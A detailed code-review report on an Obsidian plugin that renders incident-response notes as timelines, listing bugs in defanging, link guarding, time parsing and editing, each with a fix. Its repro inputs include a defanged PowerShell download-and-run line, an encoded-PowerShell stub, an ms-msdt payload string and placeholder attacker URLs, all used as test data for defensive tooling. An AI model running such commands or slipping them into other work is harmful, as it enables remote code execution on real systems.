# Note timeline — review findings, full detail

Scenario and suggested fix for each finding (see the -review.md summary for which were confirmed). Refuted ones are left out.

## Embedded notes inside a timeline card skip link neutralising and defanging in Reading view

- Where: src/timeline/reading.ts:164
- Severity: high

Scenario: Bullet `- At 11:05, alert details ![[Alert 4521]]`, where the Alert 4521 note contains `https://evil.example/payload` (bare or as a markdown link). Obsidian's postProcess (app.js 1.14.4) runs plugin post-processors first and only then loads `.internal-embed:not(.is-loaded)` with an async `loadFile()`. decorateItem's single `querySelectorAll('a')` and textNodes pass both run before the embedded content exists. The embedded note has no marker, so its own render is left undecorated too. Result: inside the timeline card, the embedded link is a live `a.external-link`, and a click opens the browser through window.open. Its indicators show undefanged. That breaks the spec rule that links in a timeline never open and indicators are shown defanged. A raw `<iframe src=…>` in a bullet also survives untouched (Obsidian's sanitizer adds iframe to the allowed tags).

Fix: Inside timeline items, either swap `.internal-embed` (and iframe) for an inert placeholder, or watch each decorated li with a MutationObserver and run the same neutralise and defang pass on nodes added later.

## Copy timeline for ticket leaves live domains that the live count and Defang timeline treat as live

- Where: src/timeline/parse.ts:713
- Severity: high

Scenario: defangText only defangs a bare domain when it is the whole value of its line, after an optional list marker or short label. copyForTicket moves values out of that position, so they come out live. (1) `- At 11:05, the user browsed.` with detail `    - Source: evil.com`: header shows 1 live indicator, and Defang changes it to `evil[.]com`. Copy gives `11:05      the user browsed. Source: evil.com`, because Source lines are joined onto the event line and become prose. (2) Untimed `- Download: promptcraft.online` or `- evil.com`: copy gives `--:--      Download: promptcraft.online (time not recorded)`, live. If nothing else changed, copyDefanged's notice says "Copied (nothing to defang)". Ticket and chat tools such as Slack auto-link bare domains.

Fix: Defang each event and detail line in note form first (defangText per source line, as defangTimeline does), then build the ticket text from the defanged lines. Or run defangIoc on every indicator span from indicatorSpans before joining or prefixing.

## Dotted meridiem ("2:29 P.M.", "12:30 a.m.") is read as a 24-hour time, producing false order, gap, span and sort

- Where: src/timeline/parse.ts:315
- Severity: medium

Scenario: MERIDIEM `/^ ?([ap]m)(?![a-z\d])/i` does not match `P.M.`, yet PHRASE_END accepts the space, so `- At 2:29 P.M., Execution: payload ran.` is read as 02:29. With `- At 11:50 AM, …` above it, the band says "earlier than the event above". The header shows `2:29 → 11:50 AM · 9 h 21 min span [derived]`. Sort events by time is offered and rewrites the note with the 2:29 P.M. event first (checked with the actions). `12:30 a.m.` is read as 12:30 noon. Copy shows `2:29       P.M., …`. The parser picks a clock nobody wrote instead of leaving the time unread.

Fix: Accept `[ap]\.?m\.?` in MERIDIEM. Or, when a clock is followed by `a.`/`p.`, treat the time as unread (unread token) and do not read a 24-hour value.

## Gaps, span and Sort compare clocks written in different zones as if they were the same zone

- Where: src/timeline/parse.ts:630
- Severity: medium

Scenario: The zone is kept as written but ignored when comparing. `- At 11:04 UTC, alert` then `- At 13:10 +02:00, response` gives the derived band "2 h 6 min later" and header span "2 h 6 min". The real interval is 6 min. ISO `2026-10-09T11:04:00Z` vs `…T13:10:00+02:00` gives the same result. A zone the parser does not read (`07:10 EDT`, which is 11:10 UTC) is treated as zoneless. Sort events by time then moves it above `11:04 UTC` and rewrites the note (sortEventsByTime returned that edit). These are made-up derived numbers, plus a note edit based on them.

Fix: In gapBetween, summarise and sortEventsByTime, treat times as comparable only when both have the same written zone (or both have none). Otherwise give no gap or span and disable Sort with a reason.

## Copy for ticket drops or misplaces stated dates when numeric and named dates mix

- Where: src/timeline/parse.ts:704
- Severity: medium

Scenario: `day` only tracks named dates and starts at summary.date. (a) `- At 10/9/26, 2:29 AM mail received.` then `- On 12 October 2026, 09:00 Response: host isolated.` copies as `Timeline, 10/9/26 (2 events)` / `2:29 AM …` / `09:00 Response: …`: the 12 October date is gone, so the ticket puts 09:00 on 10/9/26. (b) `On 3 May 2025, 11:04 a` / `At 10/9/26, 2:29 AM b` / `On 3 May 2025, 11:10 c` copies `11:10 c` under the `10/9/26` line. (c) A time-only first event under `Timeline, 3 May 2025` takes a date it never stated or carried.

Fix: Track one current written-date label (formatDay(date) or dateText) and print a date line whenever an event's stated date label differs from it. Print an event that has no stated or carried date before any date heading, or mark it as undated.

## Live-indicator count does not match what Defang timeline changes

- Where: src/timeline/parse.ts:584
- Severity: medium

Scenario: `live` marks every indicator in a token if defangText changed any part of that token, and it ignores what defangText fixes that is not an extracted indicator. (1) `- At 11:05, seen 1.2.3.4,evil.com`: header "2 live indicators", but Defang changes only the IP. Afterwards the count is 0 while `evil.com` is unchanged. (2) `- At 11:05, opened file://evil-share/x.hta`, or detail `- Payload: ms-msdt:/id PCWDiagnostic`: count 0 so no Defang pill, yet Defang timeline rewrites both (`file[:]//…`, `ms-msdt[:]/…`). (3) Reading view re-judges each text node, so `- At 11:05, evil.com` (or `**evil.com**`) shows a chip `evil[.]com` titled "Shown defanged: the note has it live". Meanwhile the header shows 0 and Defang says "Nothing in the timeline to defang."

Fix: Work out `live` by diffing each indicator's own span against defangText(line) at that position, not per token. Count the line-level changes defangTimeline would make. In Reading view, take chip liveness from the parser's spans for that line, not from the text node.

## Fenced code inside an event ends the timeline early, so Add event writes into the code block and Delete event leaves half of it behind

- Where: src/timeline/parse.ts:174
- Severity: high

Scenario: readBlock does not track fences inside an event. Two things inside an event's fenced block end the block. First, a comment line indented 2-3 spaces matches HEADING. Second, two blank lines hit the double-blank break. Repro: [M, '- At 11:06, Execution: ran the stager', '  ```powershell', '  # stage 1', '  iex (iwr hxxp://evil[.]com/a.ps1)', '  ```', '- At 11:07 next', '- At 11:05 earlier']. findTimelines gives one event covering lines 1-2 (lastLine 2). The 11:07 and 11:05 events drop out of the timeline: they are not drawn, not in Copy for ticket, not defanged, not sorted. addEventAtEnd(note, 0), which is also the '+ Add event' row, inserts '- ' between '  ```powershell' and '  # stage 1', inside the code. deleteEvent(note, 1) leaves '  # stage 1', the iex line and an orphan closing '  ```' in the note. Copy for ticket prints a dangling '```powershell'. A tab-indented fence with two blank lines inside does the same: [M,'- At 11:06 ran:','\t```','\t$a = 1','','','\t$b = 2','\t```','- At 11:05 x'] -> Delete leaves '\t$b = 2','\t```'.

Fix: In readBlock, when a detail line opens a fence (/^\s*(`{3,}|~{3,})/), take every line up to the matching closing fence as details of that event, ignoring HEADING and blank-line rules. Add tests for a 2-space '# comment' and for two blank lines inside an event's fence.

## Delete event in a loose list leaves two blank lines, which splits the timeline

- Where: src/timeline/actions.ts:241
- Severity: high

Scenario: The parser accepts one blank line between events, but removeLines takes out only the event's own lines. Repro: [M, '- a', '', '- b', '', '- c'], caret on '- b', Delete event -> [M, '- a', '', '', '- c']. findTimelines now gives events ['a'] only. 'c' silently leaves the timeline: it is drawn as a plain bullet, missing from Copy for ticket, skipped by Defang timeline (its live IOCs stay live) and by Sort. Deleting the first event when there is a blank line after the marker empties the timeline: [M, '', '- a', '', '- b'] -> [M, '', '', '- b'] gives 0 events.

Fix: In deleteEvent, if the line above the event (e.line-1) and the line below it (e.lastLine+1) are both blank, also remove the blank line below (extend the range to lastLine+1). Add a test that the event count after the delete is n-1 for a loose list.

## Make timeline over a selection with a fenced code block prefixes '- ' to the fences and every code line

- Where: src/timeline/actions.ts:86
- Severity: high

Scenario: The docstring promises null for 'a code block', but every non-bullet line at the base indent gets '- '. Repro: makeTimeline(['## Findings:', '- At 11:05 ran:', '```', 'powershell -enc AAA', '```', '- At 11:06 next'], 0, 5) returns an edit. The result is ['## Findings:', '%% timeline %%', '- At 11:05 ran:', '- ```', '- powershell -enc AAA', '- ```', '- At 11:06 next']: the pasted command is now three events. The parser check passes because every line is now a bullet. The same blanket prefixing turns a numbered list ['1. At 11:04 a','2. At 11:05 b'] into '- 1. At 11:04 a' and '- 2. At 11:05 b' (the times can no longer be read, so all events show as untimed), and turns a '---' section divider inside the selection into '- ---'.

Fix: Return null when any line in first..last is a fence line (/^\s*(`{3,}|~{3,})/) or a thematic break (/^ {0,3}([-*_])( *\1){2,} *$/). For numbered items, replace the '1. ' marker with '- ' or refuse; do not stack '- ' in front of it. Add tests for each case.

## Make timeline is offered inside YAML frontmatter and breaks the case note's properties

- Where: src/timeline/actions.ts:91
- Severity: medium

Scenario: Neither listStart nor findTimelines excludes frontmatter, and the editor-menu item and command run in Source mode. On the real 'THM- The Finance Trail.md' (copied in memory), with the caret on '  - malware' under 'tags:' (line 15), makeTimeline returns {fromLine:15, toLine:15, text:'  %% timeline %%\n  - malware'}. The same happens on '  - field: Compromised User' under caseDetails. The YAML becomes 'tags:\n  %% timeline %%\n  - malware', which a YAML parser rejects ('Plain value cannot start with directive indicator character %'). This note is a pm-task case note, so its pm-task, id, status and caseDetails become unreadable.

Fix: Find the frontmatter range (line 0 is '---', up to the next '---' or '...'). makeTimeline returns null when first <= its end, and findTimelines starts scanning after it.

## A selection ending at column 0 of the next line (triple-click, Shift+Down) also converts that unselected line

- Where: src/timeline/menu.ts:134
- Severity: medium

Scenario: The menu item (lines 133-135) and the command (line 249) pass getCursor('to').line unchanged. CodeMirror's triple-click selects a line plus its newline (rangeForClick: to++), and Shift+Down from a line start also ends at {line: n+1, ch: 0}. Repro: note ['## F', '11:04 a', '11:05 b', 'Summary para']. Select lines 1-2 with Shift+Down twice, so to = {line 3, ch 0}, then choose Make timeline. makeTimeline(note, 1, 3) gives [..., '- 11:04 a', '- 11:05 b', '- Summary para']: the unselected paragraph becomes an event. If that next line is a heading such as '###  Attack Chain Summary' after the real ClickFix Findings, the check fails and Make timeline disappears from the menu.

Fix: Before calling makeTimeline, use to.line - 1 when to.ch === 0 and to.line > from.line. Do this once in a shared helper used by both the menu item and the command.

## Set event kind on a task bullet writes the kind before the checkbox and destroys the task

- Where: src/timeline/actions.ts:172
- Severity: medium

Scenario: The parser treats '[x] ' as part of the event text, so the time behind it is never read (the event is untimed) and rest is 0. The kind word therefore goes at textFrom, in front of the box. Repro: [M, '- [x] At 11:05, isolated host', '- [ ] 11:06 notify'], setEventKind(note, 1, 'response') -> '- Response: [x] At 11:05, isolated host'. The line is no longer a task in Obsidian: the checked state becomes literal text, and Tasks queries lose it. Make timeline accepts checkbox lists, because BULLET matches them.

Fix: In readEvent, treat a leading task box (/^\[[ xX\-\/]\][ \t]+/) as part of the bullet marker: move textFrom past it. The time is then read after the box, and setEventKind and insertEvent keep it.

## Set event kind on a bare '-' bullet produces '-Detection: ', which is no longer a bullet

- Where: src/timeline/actions.ts:171
- Severity: low

Scenario: BULLET accepts '-' at the end of a line, so an empty event can be '-' (for example after trailing whitespace on '- ' is trimmed). For it textFrom = 1 = from, so the guard `from > e.textFrom` skips the space. Repro: [M, '- At 11:05 a', '-', '- At 11:06 b'], setEventKind(note, 2, 'detection') -> [M, '- At 11:05 a', '-Detection: ', '- At 11:06 b']. That line is now a paragraph, the block ends there, and '- At 11:06 b' also falls out of the timeline (findTimelines events: ['At 11:05 a']).

Fix: Drop the `from > e.textFrom` condition. Add the leading space whenever text[from-1] is not whitespace. For a normal '- x' the character before textFrom is always whitespace, so only the bare '-' case changes.

## Sort moves a time-only event above the bullet that states a numeric date and silently detaches it from that date

- Where: src/timeline/actions.ts:231
- Severity: low

Scenario: The post-sort check compares secondsOf only, and for dateless events that is minutes only, so changes to the carried dateText are invisible to it. This case comes from the user's real 'At 10/9/26, 2:29 AM' style. Repro: [M, '- At 10/9/26, 2:29 AM email sent', '- At 2:20 AM user clicked'] -> sort returns an edit that puts '- At 2:20 AM user clicked' first. That event no longer carries 10/9/26 (dateText null), so the timeline's gaps and span are no longer comparable. The named-date version of the same case ('On 3 May 2025, 11:04' / 'At 11:00') is refused with 'Sorting would move an event onto another day'.

Fix: In the post-check, also compare moved[i].time?.dateText (and date) with order[i].time?.dateText, and return the same 'write its date on it first' reason when they differ.

## Make timeline is offered inside YAML frontmatter and writes the marker there, which breaks the case's properties

- Where: src/timeline/actions.ts:74
- Severity: high

Scenario: Open 'THM- The Finance Trail.md' in Source mode (or with 'Properties in document' set to Source), put the caret on '  - Farhan' under assignees: (or any caseDetails/tags item), then right-click or run the 'Make timeline' command. listStart() treats the YAML list item as a bullet list, and the parser check passes because findTimelines does not skip frontmatter. My probe got {fromLine:13,text:'  %% timeline %%\n  - Farhan'}. The YAML lib in the repo then fails with 'Plain value cannot start with directive indicator character %'. The pm-task frontmatter becomes invalid and the case drops off its board. The same check makes the editor-menu item appear on every frontmatter list line.

Fix: Skip the frontmatter range in makeTimeline/listStart (and in findTimelines): when lines[0] is '---', ignore everything up to the closing '---', or use getFrontMatterInfo from obsidian. Return null when from..to touches that range.

## Live Preview link guard misses Obsidian's mousedown open path and popout windows

- Where: src/timeline/menu.ts:265
- Severity: high

Scenario: guardTimelineLinks only listens for click/auxclick, in capture phase, on the activeDocument present at onload. In app.js (1.14.4), the editor opens links from a capture-phase 'mousedown' listener on .markdown-source-view: middle button on desktop ("mousedown"===e.type&&1===e.button) and any tap on Android (isAndroidApp&&"mousedown"===e.type). So middle-clicking a live https:// URL in a timeline card opens it in the browser, even though the comment says auxclick stops it. Tapping a live URL on Android opens it too. A note opened in a popout window has its own document with no guard, so a plain click opens the link there as well.

Fix: Also intercept 'mousedown' in capture phase when the target is a timeline link (preventDefault and stopPropagation for button 1, and for touch on mobile). Register the guard for every window: call it for activeDocument and again from app.workspace.on('window-open', (w) => plugin.registerDomEvent(w.doc, ...)), or listen on each window in capture phase.

## Kind picker opened from the kind word closes as soon as the click ends (DOM menus)

- Where: src/timeline/livePreview.ts:386
- Severity: medium

Scenario: NoteTimelinePlugin.mousedown calls onKindClick, which runs menu.showAtMouseEvent(evt) during the mousedown. Obsidian's Menu.showAtPosition defers load() with setTimeout 0, and load registers a window 'click' handler that runs handleClickOutside. When the user releases the button, the click lands on the kind tag, outside the menu, so the menu hides immediately. This happens with DOM menus: Windows, Linux, and macOS with 'Native menus' turned off. Clicking 'EXECUTION' just flashes the menu, while clicking the node (opened on 'click') works.

Fix: Open the picker from the 'click' event, as NodeWidget does. Keep the mousedown handler only to claim the event: return true, or preventDefault to keep the caret, and call onKindClick from a click handler.

## Right-clicking a timeline widget runs the editor menu on the caret's line, not on the event that was clicked

- Where: src/timeline/livePreview.ts:112
- Severity: medium

Scenario: NodeWidget, HeaderWidget and AddWidget call preventDefault on every mousedown, right button included. Obsidian's onContextMenu never moves the selection, and the editor-menu handler uses editor.getCursor().line. Example: caret in event 2, user right-clicks event 5's node and picks 'Delete event', and event 2 is deleted. Right-clicking timeline B's header while the caret sits in timeline A shows A's items, or 'Make timeline' for some other list.

Fix: Add a 'contextmenu' listener (or a button-2 mousedown) on these widgets that dispatches the selection to the widget's line before Obsidian builds the menu; Obsidian awaits the Electron context-menu params first, so a synchronous dispatch is in time. Alternatively, stop the native menu on widgets and open the timeline Menu for that line directly.

## Reading view is not redrawn when only the marker line is added or removed

- Where: src/timeline/reading.ts:134
- Severity: medium

Scenario: Obsidian's preview renderer reuses section elements keyed by each section's HTML (parseFinish matches by html; setMode calls set(data,false), with no forced re-render). The marker is a separate section and renders to nothing, so the list section's HTML is the same with or without it. Steps: view a plain Findings list in Reading view, switch to Live Preview, run Make timeline, switch back. The list stays plain. After 'Back to plain list' the old timeline (header, cards, defanged chips) stays drawn until the note is reopened.

Fix: After applying makeTimeline/backToPlainList (and on a marker edit), call previewMode.rerender(true) for the open MarkdownView of that file, e.g. by iterating workspace leaves whose view.file matches. Another way: have the post-processor tag the section and listen for a timeline-change signal.

## Live Preview link guard also kills internal [[links]] and tags-like underlines in timeline cards

- Where: src/timeline/menu.ts:197
- Severity: low

Scenario: LINK_TARGET includes .cm-underline, which Obsidian puts on internal links (.cm-hmd-internal-link > .cm-underline). A Cmd/Ctrl-click on '[[Evidence - EDR export]]' inside a timeline card does not open the note: it copies the link text 'defanged'. Reading view (neutralise skips a.internal-link) still opens it, so the two modes behave differently and analysts cannot follow evidence links while editing.

Fix: Exclude internal links from the guard: return null when the target matches .cm-hmd-internal-link, or check the clickable token type via editor.getClickableTokenAt and only block 'external-link'/'external-ref-link'.

## Reading view draws nothing when Markdown's list runs past the parser's block

- Where: src/timeline/reading.ts:141
- Severity: low

Scenario: In the parser, two blank lines or a non-indented continuation line ('- At 11:04 the user\nopened the page') end the block. CommonMark keeps the list going in both cases: two blank lines no longer end a list, and an unindented line is a lazy continuation. Obsidian renders one <ul> with more <li> than block.events, so the items.length !== events.length guard skips the section. Live Preview draws the first part as a timeline while Reading view shows a plain list, with no hint why.

Fix: Draw the first block.events.length items when they match the events one for one, and leave the rest plain. Or make readBlock follow CommonMark (lazy continuation, several blank lines) so both views agree.

## Header is a block-level div inside the marker line, so CodeMirror's widget buffers add a blank row above and below it. Clicking or arrowing into either row and typing breaks the marker.

- Where: src/styles/note-timeline.css:77
- Severity: high

Scenario: The header comes from a Decoration.replace widget (livePreview.ts:341), and its root is `.cf-ntl-header { display:flex }`. CodeMirror (6.38.6 in node_modules, and the tile builder in Obsidian 1.14.4's app.js, addInlineWidget/flushBuffer) puts an `img.cm-widgetBuffer` (inline, 1em high) before and after every replace widget. Next to a block box, each buffer becomes its own line box. I loaded the real decorations from the Finance Trail note with Obsidian's app.css and note-timeline.css in Chromium. The marker line measured 104.5px: a 24px blank row, the 44.5px header, then 24px blank plus 12px padding. posAtCoords in the top strip gives marker.from and in the bottom strip gives marker.to. Pressing Down from the line above stops twice on the marker line (col 0, then col 14) before reaching the first card. A real click in the top strip followed by typing 'x' changed the line to `x%% timeline %%`. That no longer equals TIMELINE_MARKER, so the whole timeline turns back into a raw list.

Fix: Render the header inline in Live Preview: `.cm-line .cf-ntl-header { display:inline-flex; width:100%; vertical-align:top; box-sizing:border-box }` plus `white-space:nowrap` on `.cf-ntl-marker-line`. Measured: 56.5px, which is the header plus 12px padding, with no extra rows. Text can still be typed at the marker's edges, so also consider an inputHandler or transactionFilter that moves text typed at marker.from or marker.to onto a neighbouring line.

## Clicking a kind word opens the kind picker on mousedown, and Obsidian closes it on the same click

- Where: src/timeline/livePreview.ts:388
- Severity: high

Scenario: Left-click 'Execution' or 'Detection' on an event line. NoteTimelinePlugin.mousedown calls onKindClick, which runs openKindMenu and menu.showAtMouseEvent during mousedown. Obsidian's DOM Menu loads itself with setTimeout(load, 0) and registers a window 'click' listener (handleClickOutside). When the button is released, the click event fires on the tag span: the menu sits at x+2,y+2 and does not cover the pointer. That target is outside the menu, so the menu hides immediately. The user's vault has nativeMenus: false (Personal/.obsidian/appearance.json); Windows, Linux and mobile behave the same. The node widget works because it opens on 'click'. The unit test only checks that the callback was called, so it passes.

Fix: Keep the mousedown handler only to claim the event (return true, which calls preventDefault). Open the picker from a `click` eventHandler on `.cf-ntl-tag`, as NodeWidget does.

## Middle-click (and an Android tap) on a live URL in a timeline still opens it: the link guard only listens to click and auxclick

- Where: src/timeline/menu.ts:262
- Severity: medium

Scenario: Live Preview, Finance Trail timeline: middle-click the bare `http://lawson-rowe-review.com/review/disclosure-schedule` chip. Obsidian binds `editorEl.addEventListener('mousedown', onEditorClick, {capture:true})`. onEditorClick opens a clickable token when `mousedown && button===1` on desktop, and on any mousedown on Android. guardTimelineLinks is registered only for 'click' and 'auxclick', and both fire after mouseup, after the link has already opened. Its comment says the middle button is stopped, but it is not.

Fix: Also register a capture-phase 'mousedown' listener on the document. Stop it when timelineLinkAt(target) matches and either button===1 or the platform is Android. Leave button 0 alone on desktop so the caret can still be placed.

## Right-clicking a card's node, or the header, opens the timeline menu for the caret's event, not the one clicked

- Where: src/timeline/livePreview.ts:112
- Severity: medium

Scenario: Put the caret in event 5, right-click event 2's node and choose 'Delete event': event 5 is deleted. NodeWidget (and HeaderWidget, line 79) call preventDefault on mousedown for every button, and the widget is contenteditable=false, so the caret does not move. Obsidian's editor onContextMenu never moves the caret itself; it relies on the browser's right-click caret placement. The 'editor-menu' handler builds items with editor.getCursor().line. So Delete, Move up/down and Set kind all act on the caret's event. Right-clicking the header can even offer 'Make timeline' for a different list.

Fix: Call preventDefault only for button 0. On button 2 mousedown (or on contextmenu) on a node, first dispatch a selection to that event's text start, `view.dispatch({selection:{anchor: line.from + textFrom}})`. Do the same for the header, using the marker line.

## '+ Add event' does not focus the editor, so typing after the click goes elsewhere

- Where: src/timeline/livePreview.ts:195
- Severity: medium

Scenario: Click into the outline, properties or the plugin's side panel, then click '+ Add event' under the last card. AddWidget calls preventDefault on mousedown, so the contenteditable never takes focus. Obsidian's leaf pointerdown calls setActiveLeaf(leaf) without focus:true. The callback (addEventAtEnd, then applyEdit) only runs editor.transaction and editor.setCursor, and neither focuses (checked in app.js). An empty '- ' card with the ghost hint appears, but '11:07 ...' typed next does not go into it.

Fix: Call view.focus() in the Add row's click (and keyboard) handler after onAddEvent, or have onAddEvent call editor.focus() after apply.

## The link guard is registered only on the main window's document, so links in timelines in popout windows still open on a plain click

- Where: src/timeline/menu.ts:262
- Severity: low

Scenario: `plugin.registerDomEvent(activeDocument, ...)` runs once at load, when activeDocument is the main window. Open the case note with 'Open in new window' and click the live URL chip in Live Preview. Obsidian's onEditorClick opens an external `.cm-url`/`.cm-underline` token on a plain click in Live Preview, and no guard exists in that window's document, so the attacker URL opens.

Fix: Register the click, auxclick and mousedown guards for every window: loop over existing windows and listen to `app.workspace.on('window-open', (_, win) => plugin.registerDomEvent(win.doc, ...))`. Alternatively, attach the guard per editor in the ViewPlugin (view.dom capture listeners).

## A folded event with details loses its card bottom and the Add row, and the hidden fold arrow leaves no way to unfold it by clicking

- Where: src/styles/note-timeline.css:597
- Severity: low

Scenario: Give the last event a detail line (e.g. '    - Source: EDR process tree'). Run 'Fold all headings and lists', then unfold the '### Findings' heading. Obsidian's fold is a replace decoration over the detail lines, so the line decorations on them are dropped. The card-bottom padding, border and radius live on the hidden last line, so they disappear. So do cf-ntl-last (the foot) and the AddWidget at bottom.to, which sits inside the folded range. The CSS also hides `.cm-fold-indicator .collapse-indicator` and the bullet on timeline lines, so nothing shows the details are folded and nothing can be clicked to unfold them. Obsidian restores per-file fold state, so this also happens to a list that was folded before 'Make timeline'.

Fix: Keep the collapse indicator visible on event lines (place it on the node, or show a 'details hidden' mark when foldedRanges cover the card). Compute card-bottom, last and the Add widget position from the last visible line when part of the card is folded.
